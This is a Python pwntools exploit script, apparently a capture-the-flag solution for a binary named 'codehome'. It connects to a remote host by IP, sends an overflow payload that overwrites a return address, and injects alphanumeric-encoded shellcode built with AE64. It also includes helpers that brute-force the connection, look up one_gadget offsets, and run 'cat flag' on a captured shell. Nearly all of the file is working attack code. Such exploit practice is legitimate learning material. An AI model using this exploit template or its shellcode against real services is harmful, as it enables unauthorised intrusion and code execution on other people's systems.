# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from ae64 import AE64
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './codehome'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '1.116.140.142'
    port = '60020'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    shellcode = '''
    mov rsi , rcx
    shl rsi , 36
    shr rsi , 48
    shl rsi , 12
    mov rdx , 100
    mov rdi , 1
    mov rax , 1
    syscall
    '''

    obj = AE64()
    sc = obj.encode(asm(shellcode),'rax')
    # dbg('*$rebase(0x0000000000001215)')

    sla('>>',0x24)
    # sa('>>','a'*0x14 + 'a'*8 + p64(0x44440000))
    sa('>>' , 'a'*0x14 + p64(0) + p64(0x44440000) )
    # dbg('*$rebase(0x00000000001204)')
    sla('>>',sc)

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   codehome.py
@Time    :   2021/12/05 13:55:45
@Author  :   Niyah 
'''